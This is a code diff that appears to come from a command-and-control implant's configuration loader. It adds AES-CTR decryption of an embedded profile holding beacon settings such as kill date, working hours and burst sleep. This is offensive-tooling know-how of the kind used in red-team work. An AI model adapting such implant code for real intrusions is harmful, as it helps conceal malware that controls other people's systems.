@@ -23,13 +23,26 @@ AgentConfig::AgentConfig()
 	memcpy(ProfileBytes, getProfile(), size);
 
 	Packer* packer = new Packer((BYTE*)ProfileBytes, size);
-	ULONG profileSize = packer->Unpack32();
+	ULONG encryptedProfileSize = packer->Unpack32();
+	this->crypto_type = packer->Unpack32();
+	BYTE* encryptedProfile = packer->data() + 8;
 
 	this->encrypt_key = (PBYTE) MemAllocLocal(16);
-	memcpy(this->encrypt_key, packer->data() + 4 + profileSize, 16);
+	memcpy(this->encrypt_key, packer->data() + 8 + encryptedProfileSize, 16);
 
-	DecryptRC4(packer->data()+4, profileSize, this->encrypt_key, 16);
-	
+	if (this->crypto_type == CRYPTO_AES) {
+		// AES-128-CTR decrypt with IV prepended
+		AesCtrEncryptBuffer(encryptedProfile + 16, encryptedProfileSize - 16, this->encrypt_key, 16, encryptedProfile, 16);
+		memmove(encryptedProfile, encryptedProfile + 16, encryptedProfileSize - 16);
+		delete packer;
+		packer = new Packer(encryptedProfile, encryptedProfileSize - 16);
+	} else {
+		// RC4 decrypt
+		DecryptRC4(encryptedProfile, encryptedProfileSize, this->encrypt_key, 16);
+		delete packer;
+		packer = new Packer(encryptedProfile, encryptedProfileSize);
+	}
+
 	this->agent_type   = packer->Unpack32();
 	this->kill_date    = packer->Unpack32();
 	this->working_time = packer->Unpack32();
@@ -93,6 +106,7 @@ AgentConfig::AgentConfig()
 	this->profile.label_size    = packer->Unpack32();
 	this->profile.ttl           = packer->Unpack32();
 	this->profile.encrypt_key   = this->encrypt_key;
+	this->profile.crypto_type   = this->crypto_type;
 	this->profile.burst_enabled = packer->Unpack32();
 	this->profile.burst_sleep   = packer->Unpack32();
 	this->profile.burst_jitter  = packer->Unpack32();
